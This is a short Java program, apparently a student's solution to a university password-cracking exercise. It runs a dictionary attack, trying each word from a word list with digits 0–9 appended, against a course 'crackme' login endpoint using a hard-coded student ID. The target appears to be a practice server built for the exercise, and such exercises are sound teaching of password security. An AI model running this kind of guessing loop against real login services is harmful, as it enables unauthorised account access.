import java.io.*;
import java.net.*;
import java.util.*;

public class PasswordCracker1 {
    public static void main(String[] args) throws Exception {
        String myUWID = "jwunderl";
        /* Read in a dictionary of possible passwords from a dictionary file. */

        
        /* Try all of the passwords in the dictionary. */
        Scanner input = new Scanner(new File("plainwords.txt"));
        while (input.hasNextLine()){
            String line = input.nextLine();
            Scanner lines = new Scanner(line);
            //System.out.println(lines.next());
            String temp = lines.next();
            System.out.print(tryPassword(0, myUWID, temp));
            for (int i = 0; i < 10; i++){
               System.out.print(tryPassword(0, myUWID, temp + "" + i));
            }
        }
    
        

    }
    
    /* This function sends a request to the website with the level, UW ID, and password you use above. */
    public static String tryPassword(int level, String uwid, String password) throws Exception {
        URL url = new URL("http://grinch.cs.washington.edu/password/crackme" + level + ".py");

        /* Set up the map of parameters for the POST request. */
        Map<String, String> params = new HashMap<String, String>();
        params.put("uwid", uwid);
        params.put("password", password); 

        /* Encode the parameters in the POST request map. */
        StringBuilder postData = new StringBuilder();
        for (String key : params.keySet()) {
            if (postData.length() != 0) postData.append('&');
            postData.append(URLEncoder.encode(key, "UTF-8"));
            postData.append('=');
            postData.append(URLEncoder.encode(params.get(key), "UTF-8"));
        }
        byte[] postDataBytes = postData.toString().getBytes("UTF-8");

        /* Create the POST request, and write the data. */
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
        conn.setDoOutput(true);
        conn.getOutputStream().write(postDataBytes);

        /* Read the response from the server. */
        Reader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
        StringBuilder response = new StringBuilder();
        int c = in.read();
        while (c >= 0) {
            response.append((char)c);
            c = in.read();
        }
        return response.toString();
    }
}